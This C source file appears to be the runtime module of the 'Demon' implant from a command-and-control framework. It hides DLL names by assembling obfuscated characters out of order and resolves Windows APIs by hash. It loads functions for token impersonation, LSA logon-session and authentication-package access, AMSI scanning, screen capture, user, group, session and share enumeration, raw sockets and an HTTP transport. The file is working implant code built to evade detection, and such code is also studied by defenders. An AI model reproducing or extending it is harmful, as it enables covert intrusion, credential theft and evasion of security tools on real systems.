#include <Demon.h>
#include <core/Runtime.h>
#include <core/MiniStd.h>


BOOL RtAdvapi32(
    VOID
) {
    CHAR ModuleName[ 13 ] = { 0 };

    ModuleName[ 0  ] = HideChar('A');
    ModuleName[ 2  ] = HideChar('V');
    ModuleName[ 11 ] = HideChar('L');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 3  ] = HideChar('A');
    ModuleName[ 8  ] = HideChar('.');
    ModuleName[ 12 ] = HideChar('\0');
    ModuleName[ 6  ] = HideChar('3');
    ModuleName[ 7  ] = HideChar('2');
    ModuleName[ 1  ] = HideChar('D');
    ModuleName[ 9  ] = HideChar('D');
    ModuleName[ 5  ] = HideChar('I');
    ModuleName[ 4  ] = HideChar('P');

    if ( ( ((INSTANCE *)Instance)->Modules.Advapi32 = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        ((INSTANCE *)Instance)->Win32.GetTokenInformation          = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_GETTOKENINFORMATION );
        ((INSTANCE *)Instance)->Win32.CreateProcessWithTokenW      = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_CREATEPROCESSWITHTOKENW );
        ((INSTANCE *)Instance)->Win32.CreateProcessWithLogonW      = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_CREATEPROCESSWITHLOGONW );
        ((INSTANCE *)Instance)->Win32.RevertToSelf                 = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_REVERTTOSELF );
        ((INSTANCE *)Instance)->Win32.GetUserNameA                 = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_GETUSERNAMEA );
        ((INSTANCE *)Instance)->Win32.LogonUserW                   = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_LOGONUSERW );
        ((INSTANCE *)Instance)->Win32.LookupPrivilegeValueA        = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_LOOKUPPRIVILEGEVALUEA );
        ((INSTANCE *)Instance)->Win32.LookupAccountSidA            = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_LOOKUPACCOUNTSIDA );
        ((INSTANCE *)Instance)->Win32.LookupAccountSidW            = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_LOOKUPACCOUNTSIDW );
        ((INSTANCE *)Instance)->Win32.OpenThreadToken              = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_OPENTHREADTOKEN );
        ((INSTANCE *)Instance)->Win32.OpenProcessToken             = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_OPENPROCESSTOKEN );
        ((INSTANCE *)Instance)->Win32.AdjustTokenPrivileges        = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_ADJUSTTOKENPRIVILEGES );
        ((INSTANCE *)Instance)->Win32.LookupPrivilegeNameA         = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_LOOKUPPRIVILEGENAMEA );
        ((INSTANCE *)Instance)->Win32.SystemFunction032            = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_SYSTEMFUNCTION032 );
        ((INSTANCE *)Instance)->Win32.FreeSid                      = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_FREESID );
        ((INSTANCE *)Instance)->Win32.SetSecurityDescriptorSacl    = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_SETSECURITYDESCRIPTORSACL );
        ((INSTANCE *)Instance)->Win32.SetSecurityDescriptorDacl    = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_SETSECURITYDESCRIPTORDACL );
        ((INSTANCE *)Instance)->Win32.InitializeSecurityDescriptor = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_INITIALIZESECURITYDESCRIPTOR );
        ((INSTANCE *)Instance)->Win32.AddMandatoryAce              = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_ADDMANDATORYACE );
        ((INSTANCE *)Instance)->Win32.InitializeAcl                = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_INITIALIZEACL );
        ((INSTANCE *)Instance)->Win32.AllocateAndInitializeSid     = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_ALLOCATEANDINITIALIZESID );
        ((INSTANCE *)Instance)->Win32.CheckTokenMembership         = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_CHECKTOKENMEMBERSHIP );
        ((INSTANCE *)Instance)->Win32.SetEntriesInAclW             = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_SETENTRIESINACLW );
        ((INSTANCE *)Instance)->Win32.SetThreadToken               = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_SETTHREADTOKEN );
        ((INSTANCE *)Instance)->Win32.LsaNtStatusToWinError        = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_LSANTSTATUSTOWINERROR );
        ((INSTANCE *)Instance)->Win32.EqualSid                     = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_EQUALSID );
        ((INSTANCE *)Instance)->Win32.ConvertSidToStringSidW       = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_CONVERTSIDTOSTRINGSIDW );
        ((INSTANCE *)Instance)->Win32.GetSidSubAuthorityCount      = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_GETSIDSUBAUTHORITYCOUNT );
        ((INSTANCE *)Instance)->Win32.GetSidSubAuthority           = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Advapi32, H_FUNC_GETSIDSUBAUTHORITY );

        PUTS( "Loaded Advapi32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Advapi32" )
        return FALSE;
    }

    return TRUE;
}

// we delay loading mscoree.dll
BOOL RtMscoree(
    VOID
) {
    CHAR ModuleName[ 12 ] = { 0 };

    if ( ((INSTANCE *)Instance)->Win32.CLRCreateInstance )
        return TRUE;

    ModuleName[ 1  ] = HideChar('S');
    ModuleName[ 2  ] = HideChar('C');
    ModuleName[ 11 ] = HideChar(0);
    ModuleName[ 0  ] = HideChar('M');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 8  ] = HideChar('D');
    ModuleName[ 7  ] = HideChar('.');
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 5  ] = HideChar('E');
    ModuleName[ 4  ] = HideChar('R');
    ModuleName[ 6  ] = HideChar('E');
    ModuleName[ 3  ] = HideChar('O');

    if ( ( ((INSTANCE *)Instance)->Modules.Mscoree = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        ((INSTANCE *)Instance)->Win32.CLRCreateInstance = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Mscoree, H_FUNC_CLRCREATEINSTANCE );

        PUTS( "Loaded Mscoree functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Mscoree" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtOleaut32(
    VOID
) {
    CHAR ModuleName[ 13 ] = { 0 };

    ModuleName[ 3  ] = HideChar('A');
    ModuleName[ 2  ] = HideChar('E');
    ModuleName[ 0  ] = HideChar('O');
    ModuleName[ 1  ] = HideChar('L');
    ModuleName[ 5  ] = HideChar('T');
    ModuleName[ 11 ] = HideChar('L');
    ModuleName[ 7  ] = HideChar('2');
    ModuleName[ 6  ] = HideChar('3');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 12 ] = HideChar(0);
    ModuleName[ 4  ] = HideChar('U');
    ModuleName[ 9  ] = HideChar('D');
    ModuleName[ 8  ] = HideChar('.');

    if ( ( ((INSTANCE *)Instance)->Modules.Oleaut32 = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        ((INSTANCE *)Instance)->Win32.SafeArrayAccessData   = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Oleaut32, H_FUNC_SAFEARRAYACCESSDATA );
        ((INSTANCE *)Instance)->Win32.SafeArrayUnaccessData = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Oleaut32, H_FUNC_SAFEARRAYUNACCESSDATA );
        ((INSTANCE *)Instance)->Win32.SafeArrayCreate       = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Oleaut32, H_FUNC_SAFEARRAYCREATE );
        ((INSTANCE *)Instance)->Win32.SafeArrayPutElement   = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Oleaut32, H_FUNC_SAFEARRAYPUTELEMENT );
        ((INSTANCE *)Instance)->Win32.SafeArrayCreateVector = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Oleaut32, H_FUNC_SAFEARRAYCREATEVECTOR );
        ((INSTANCE *)Instance)->Win32.SafeArrayDestroy      = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Oleaut32, H_FUNC_SAFEARRAYDESTROY );
        ((INSTANCE *)Instance)->Win32.SysAllocString        = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Oleaut32, H_FUNC_SYSALLOCSTRING );

        PUTS( "Loaded Oleaut32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Oleaut32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtUser32(
    VOID
) {
    CHAR ModuleName[ 11 ] = { 0 };

    ModuleName[ 1  ] = HideChar('S');
    ModuleName[ 0  ] = HideChar('U');
    ModuleName[ 10 ] = HideChar(0);
    ModuleName[ 6  ] = HideChar('.');
    ModuleName[ 8  ] = HideChar('L');
    ModuleName[ 7  ] = HideChar('D');
    ModuleName[ 5  ] = HideChar('2');
    ModuleName[ 3  ] = HideChar('R');
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 2  ] = HideChar('E');
    ModuleName[ 4  ] = HideChar('3');

    if ( ( ((INSTANCE *)Instance)->Modules.User32 = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        ((INSTANCE *)Instance)->Win32.ShowWindow       = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.User32, H_FUNC_SHOWWINDOW );
        ((INSTANCE *)Instance)->Win32.GetSystemMetrics = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.User32, H_FUNC_GETSYSTEMMETRICS );
        ((INSTANCE *)Instance)->Win32.GetDC            = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.User32, H_FUNC_GETDC );
        ((INSTANCE *)Instance)->Win32.ReleaseDC        = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.User32, H_FUNC_RELEASEDC );

        PUTS( "Loaded User32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load User32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtShell32(
    VOID
) {
    CHAR ModuleName[ 12 ] = { 0 };

    ModuleName[ 0  ] = HideChar('S');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 7  ] = HideChar('.');
    ModuleName[ 6  ] = HideChar('2');
    ModuleName[ 8  ] = HideChar('D');
    ModuleName[ 4  ] = HideChar('L');
    ModuleName[ 1  ] = HideChar('H');
    ModuleName[ 11 ] = HideChar(0);
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 5  ] = HideChar('3');
    ModuleName[ 3  ] = HideChar('L');
    ModuleName[ 2  ] = HideChar('E');

    if ( ( ((INSTANCE *)Instance)->Modules.Shell32 = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        ((INSTANCE *)Instance)->Win32.CommandLineToArgvW = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Shell32, H_FUNC_COMMANDLINETOARGVW );

        PUTS( "Loaded Shell32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Shell32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtMsvcrt(
    VOID
) {
    CHAR ModuleName[ 11 ] = { 0 };

    ModuleName[ 0  ] = HideChar('M');
    ModuleName[ 6  ] = HideChar('.');
    ModuleName[ 10 ] = HideChar(0);
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 4  ] = HideChar('R');
    ModuleName[ 2  ] = HideChar('V');
    ModuleName[ 8  ] = HideChar('L');
    ModuleName[ 7  ] = HideChar('D');
    ModuleName[ 3  ] = HideChar('C');
    ModuleName[ 5  ] = HideChar('T');
    ModuleName[ 1  ] = HideChar('S');

    if ( ( ((INSTANCE *)Instance)->Modules.Msvcrt = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        ((INSTANCE *)Instance)->Win32.vsnprintf  = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Msvcrt, H_FUNC_VSNPRINTF );
        ((INSTANCE *)Instance)->Win32.swprintf_s = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Msvcrt, H_FUNC_SWPRINTF_S );

        PUTS( "Loaded Msvcrt functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Msvcrt" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtIphlpapi(
    VOID
) {
    CHAR ModuleName[ 13 ] = { 0 };

    ModuleName[ 8  ] = HideChar('.');
    ModuleName[ 0  ] = HideChar('I');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 2  ] = HideChar('H');
    ModuleName[ 9  ] = HideChar('D');
    ModuleName[ 6  ] = HideChar('P');
    ModuleName[ 11 ] = HideChar('L');
    ModuleName[ 1  ] = HideChar('P');
    ModuleName[ 3  ] = HideChar('L');
    ModuleName[ 12 ] = HideChar(0);
    ModuleName[ 5  ] = HideChar('A');
    ModuleName[ 4  ] = HideChar('P');
    ModuleName[ 7  ] = HideChar('I');

    if ( ( ((INSTANCE *)Instance)->Modules.Iphlpapi = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        ((INSTANCE *)Instance)->Win32.GetAdaptersInfo = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Iphlpapi, H_FUNC_GETADAPTERSINFO );

        PUTS( "Loaded Iphlpapi functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Iphlpapi" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtGdi32(
    VOID
) {
    CHAR ModuleName[ 10 ] = { 0 };

    ModuleName[ 4 ] = HideChar('2');
    ModuleName[ 6 ] = HideChar('D');
    ModuleName[ 5 ] = HideChar('.');
    ModuleName[ 8 ] = HideChar('L');
    ModuleName[ 2 ] = HideChar('I');
    ModuleName[ 1 ] = HideChar('D');
    ModuleName[ 7 ] = HideChar('L');
    ModuleName[ 9 ] = HideChar(0);
    ModuleName[ 0 ] = HideChar('G');
    ModuleName[ 3 ] = HideChar('3');

    if ( ( ((INSTANCE *)Instance)->Modules.Gdi32 = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        ((INSTANCE *)Instance)->Win32.GetCurrentObject   = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Gdi32, H_FUNC_GETCURRENTOBJECT );
        ((INSTANCE *)Instance)->Win32.GetObjectW         = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Gdi32, H_FUNC_GETOBJECTW );
        ((INSTANCE *)Instance)->Win32.CreateCompatibleDC = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Gdi32, H_FUNC_CREATECOMPATIBLEDC );
        ((INSTANCE *)Instance)->Win32.CreateDIBSection   = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Gdi32, H_FUNC_CREATEDIBSECTION );
        ((INSTANCE *)Instance)->Win32.SelectObject       = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Gdi32, H_FUNC_SELECTOBJECT );
        ((INSTANCE *)Instance)->Win32.BitBlt             = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Gdi32, H_FUNC_BITBLT );
        ((INSTANCE *)Instance)->Win32.DeleteObject       = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Gdi32, H_FUNC_DELETEOBJECT );
        ((INSTANCE *)Instance)->Win32.DeleteDC           = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Gdi32, H_FUNC_DELETEDC );

        PUTS( "Loaded Gdi32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Gdi32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtNetApi32(
    VOID
) {
    CHAR ModuleName[ 13 ] = { 0 };

    ModuleName[ 0  ] = HideChar('N');
    ModuleName[ 11 ] = HideChar('L');
    ModuleName[ 8  ] = HideChar('.');
    ModuleName[ 9  ] = HideChar('D');
    ModuleName[ 6  ] = HideChar('3');
    ModuleName[ 2  ] = HideChar('T');
    ModuleName[ 3  ] = HideChar('A');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 12 ] = HideChar(0);
    ModuleName[ 4  ] = HideChar('P');
    ModuleName[ 5  ] = HideChar('I');
    ModuleName[ 1  ] = HideChar('E');
    ModuleName[ 7  ] = HideChar('2');

    if ( ( ((INSTANCE *)Instance)->Modules.NetApi32 = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        ((INSTANCE *)Instance)->Win32.NetLocalGroupEnum = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.NetApi32, H_FUNC_NETLOCALGROUPENUM );
        ((INSTANCE *)Instance)->Win32.NetGroupEnum      = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.NetApi32, H_FUNC_NETGROUPENUM );
        ((INSTANCE *)Instance)->Win32.NetUserEnum       = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.NetApi32, H_FUNC_NETUSERENUM );
        ((INSTANCE *)Instance)->Win32.NetWkstaUserEnum  = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.NetApi32, H_FUNC_NETWKSTAUSERENUM );
        ((INSTANCE *)Instance)->Win32.NetSessionEnum    = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.NetApi32, H_FUNC_NETSESSIONENUM );
        ((INSTANCE *)Instance)->Win32.NetShareEnum      = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.NetApi32, H_FUNC_NETSHAREENUM );
        ((INSTANCE *)Instance)->Win32.NetApiBufferFree  = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.NetApi32, H_FUNC_NETAPIBUFFERFREE );

        PUTS( "Loaded NetApi32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load NetApi32" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtWs2_32(
    VOID
) {
    CHAR ModuleName[ 11 ] = { 0 };

    ModuleName[ 0  ] = HideChar('W');
    ModuleName[ 2  ] = HideChar('2');
    ModuleName[ 4  ] = HideChar('3');
    ModuleName[ 6  ] = HideChar('.');
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 1  ] = HideChar('S');
    ModuleName[ 3  ] = HideChar('_');
    ModuleName[ 5  ] = HideChar('2');
    ModuleName[ 10 ] = HideChar(0);
    ModuleName[ 8  ] = HideChar('L');
    ModuleName[ 7  ] = HideChar('D');

    if ( ( ((INSTANCE *)Instance)->Modules.Ws2_32 = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        ((INSTANCE *)Instance)->Win32.WSAStartup      = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ws2_32, H_FUNC_WSASTARTUP );
        ((INSTANCE *)Instance)->Win32.WSACleanup      = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ws2_32, H_FUNC_WSACLEANUP );
        ((INSTANCE *)Instance)->Win32.WSASocketA      = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ws2_32, H_FUNC_WSASOCKETA );
        ((INSTANCE *)Instance)->Win32.WSAGetLastError = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ws2_32, H_FUNC_WSAGETLASTERROR );
        ((INSTANCE *)Instance)->Win32.ioctlsocket     = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ws2_32, H_FUNC_IOCTLSOCKET );
        ((INSTANCE *)Instance)->Win32.bind            = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ws2_32, H_FUNC_BIND );
        ((INSTANCE *)Instance)->Win32.listen          = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ws2_32, H_FUNC_LISTEN );
        ((INSTANCE *)Instance)->Win32.accept          = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ws2_32, H_FUNC_ACCEPT );
        ((INSTANCE *)Instance)->Win32.closesocket     = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ws2_32, H_FUNC_CLOSESOCKET );
        ((INSTANCE *)Instance)->Win32.recv            = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ws2_32, H_FUNC_RECV );
        ((INSTANCE *)Instance)->Win32.send            = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ws2_32, H_FUNC_SEND );
        ((INSTANCE *)Instance)->Win32.connect         = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ws2_32, H_FUNC_CONNECT );
        ((INSTANCE *)Instance)->Win32.getaddrinfo     = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ws2_32, H_FUNC_GETADDRINFO );
        ((INSTANCE *)Instance)->Win32.freeaddrinfo    = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ws2_32, H_FUNC_FREEADDRINFO );

        PUTS( "Loaded Ws2_32 functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Ws2_32" )
        return FALSE;
    }

    return TRUE;
}


BOOL RtSspicli(
    VOID
) {
    CHAR ModuleName[ 12 ] = { 0 };

    ModuleName[ 0  ] = HideChar('S');
    ModuleName[ 11 ] = HideChar(0);
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 1  ] = HideChar('S');
    ModuleName[ 6  ] = HideChar('I');
    ModuleName[ 7  ] = HideChar('.');
    ModuleName[ 5  ] = HideChar('L');
    ModuleName[ 8  ] = HideChar('D');
    ModuleName[ 2  ] = HideChar('P');
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 4  ] = HideChar('C');
    ModuleName[ 3  ] = HideChar('I');

    if ( ( ((INSTANCE *)Instance)->Modules.Sspicli = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        ((INSTANCE *)Instance)->Win32.LsaRegisterLogonProcess        = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Sspicli, H_FUNC_LSAREGISTERLOGONPROCESS );
        ((INSTANCE *)Instance)->Win32.LsaLookupAuthenticationPackage = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Sspicli, H_FUNC_LSALOOKUPAUTHENTICATIONPACKAGE );
        ((INSTANCE *)Instance)->Win32.LsaDeregisterLogonProcess      = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Sspicli, H_FUNC_LSADEREGISTERLOGONPROCESS );
        ((INSTANCE *)Instance)->Win32.LsaConnectUntrusted            = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Sspicli, H_FUNC_LSACONNECTUNTRUSTED );
        ((INSTANCE *)Instance)->Win32.LsaFreeReturnBuffer            = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Sspicli, H_FUNC_LSAFREERETURNBUFFER );
        ((INSTANCE *)Instance)->Win32.LsaCallAuthenticationPackage   = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Sspicli, H_FUNC_LSACALLAUTHENTICATIONPACKAGE );
        ((INSTANCE *)Instance)->Win32.LsaGetLogonSessionData         = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Sspicli, H_FUNC_LSAGETLOGONSESSIONDATA );
        ((INSTANCE *)Instance)->Win32.LsaEnumerateLogonSessions      = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Sspicli, H_FUNC_LSAENUMERATELOGONSESSIONS );

        PUTS( "Loaded Sspicli functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Sspicli" )
        return FALSE;
    }

    return TRUE;
}

BOOL RtAmsi(
    VOID
) {
    CHAR ModuleName[ 9 ] = { 0 };

    ModuleName[ 3 ] = HideChar('I');
    ModuleName[ 5 ] = HideChar('D');
    ModuleName[ 7 ] = HideChar('L');
    ModuleName[ 8 ] = HideChar(0);
    ModuleName[ 6 ] = HideChar('L');
    ModuleName[ 4 ] = HideChar('.');
    ModuleName[ 0 ] = HideChar('A');
    ModuleName[ 1 ] = HideChar('M');
    ModuleName[ 2 ] = HideChar('S');

    if ( ( ((INSTANCE *)Instance)->Modules.Amsi = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        ((INSTANCE *)Instance)->Win32.AmsiScanBuffer = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Amsi, H_FUNC_AMSISCANBUFFER );

        PUTS( "Loaded Amsi functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load Amsi" )
        return FALSE;
    }

    return TRUE;
}

#ifdef TRANSPORT_HTTP
BOOL RtWinHttp(
    VOID
) {
    CHAR ModuleName[ 12 ] = { 0 };

    ModuleName[ 0  ] = HideChar('W');
    ModuleName[ 2  ] = HideChar('N');
    ModuleName[ 7  ] = HideChar('.');
    ModuleName[ 11 ] = HideChar(0);
    ModuleName[ 10 ] = HideChar('L');
    ModuleName[ 4  ] = HideChar('T');
    ModuleName[ 8  ] = HideChar('D');
    ModuleName[ 1  ] = HideChar('I');
    ModuleName[ 9  ] = HideChar('L');
    ModuleName[ 6  ] = HideChar('P');
    ModuleName[ 3  ] = HideChar('H');
    ModuleName[ 5  ] = HideChar('T');

    if ( ( ((INSTANCE *)Instance)->Modules.WinHttp = LdrModuleLoad( ModuleName ) ) ) {
        MemZero( ModuleName, sizeof( ModuleName ) );
        ((INSTANCE *)Instance)->Win32.WinHttpOpen                           = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.WinHttp, H_FUNC_WINHTTPOPEN );
        ((INSTANCE *)Instance)->Win32.WinHttpConnect                        = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.WinHttp, H_FUNC_WINHTTPCONNECT );
        ((INSTANCE *)Instance)->Win32.WinHttpOpenRequest                    = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.WinHttp, H_FUNC_WINHTTPOPENREQUEST );
        ((INSTANCE *)Instance)->Win32.WinHttpSetOption                      = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.WinHttp, H_FUNC_WINHTTPSETOPTION );
        ((INSTANCE *)Instance)->Win32.WinHttpCloseHandle                    = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.WinHttp, H_FUNC_WINHTTPCLOSEHANDLE );
        ((INSTANCE *)Instance)->Win32.WinHttpSendRequest                    = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.WinHttp, H_FUNC_WINHTTPSENDREQUEST );
        ((INSTANCE *)Instance)->Win32.WinHttpAddRequestHeaders              = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.WinHttp, H_FUNC_WINHTTPADDREQUESTHEADERS );
        ((INSTANCE *)Instance)->Win32.WinHttpReceiveResponse                = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.WinHttp, H_FUNC_WINHTTPRECEIVERESPONSE );
        ((INSTANCE *)Instance)->Win32.WinHttpReadData                       = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.WinHttp, H_FUNC_WINHTTPREADDATA );
        ((INSTANCE *)Instance)->Win32.WinHttpQueryHeaders                   = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.WinHttp, H_FUNC_WINHTTPQUERYHEADERS );
        ((INSTANCE *)Instance)->Win32.WinHttpGetIEProxyConfigForCurrentUser = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.WinHttp, H_FUNC_WINHTTPGETIEPROXYCONFIGFORCURRENTUSER );
        ((INSTANCE *)Instance)->Win32.WinHttpGetProxyForUrl                 = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.WinHttp, H_FUNC_WINHTTPGETPROXYFORURL );

        PUTS( "Loaded WinHttp functions" )
    } else {
        MemZero( ModuleName, sizeof( ModuleName ) );
        PUTS( "Failed to load WinHttp" )
        return FALSE;
    }

    return TRUE;
}
#endif
